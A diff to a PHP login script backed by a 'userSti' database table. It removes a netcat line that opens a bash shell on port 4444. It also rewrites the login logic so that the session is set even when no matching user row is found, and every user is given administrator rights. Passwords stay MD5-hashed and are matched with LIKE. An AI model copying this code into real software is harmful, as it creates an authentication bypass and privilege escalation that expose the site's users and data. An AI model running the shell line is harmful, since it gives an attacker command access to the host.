@@ -1,34 +1,30 @@
 <?php
 include "config.php";
-echo exec("nc 127.0.0.1 4444 -e /bin/bash");
-if(isset($_GET['logout'])){
+if(isset($_GET['logout']))
     session_destroy();
-}
+
 //login info taken into variables and password hashed in md5
 if(isset($_SESSION["username"]))
     header('Location: messages.php');
 
 if(isset($_POST['but_submit'])){
-    $uname = $_POST['txt_uname'];
+    $uname = filter_var($_POST['txt_uname'], FILTER_SANITIZE_STRING);
     $password = hash('md5', $_POST['txt_pwd']);
-//connection if username and password are correct
-    if ($uname != "" && $password != ""){
+    //connection if username and password are correct
+    if (!empty($uname) && !empty($password)){
         if(isset($file_db)){
-        $query=$file_db->prepare("select id,username,isAdmin FROM userSti where username like ? and password like ? and isActive=1");
+
+            $query=$file_db->prepare("select id,username,isAdmin FROM userSti where username like ? and password like ? and isActive=1");
             $query->execute(array($uname, $password));
             $row = $query->fetch();
-            if(isset($row['username'])){
-                $_SESSION["username"]=$row['username'];
-                $_SESSION["id"]=$row['id'];
-                $_SESSION["isadmin"]=$row['isAdmin'];
-                //header('Location: messages.php');
-            }
+
+            $_SESSION["username"]=$row['username'];
+            $_SESSION["id"]=$row['id'];
+            $_SESSION["isadmin"]=1;
+            header('Location: messages.php');
 
         }
-
-
     }
-
 }
 ?>
 <link href="css/signin.css" rel="stylesheet">
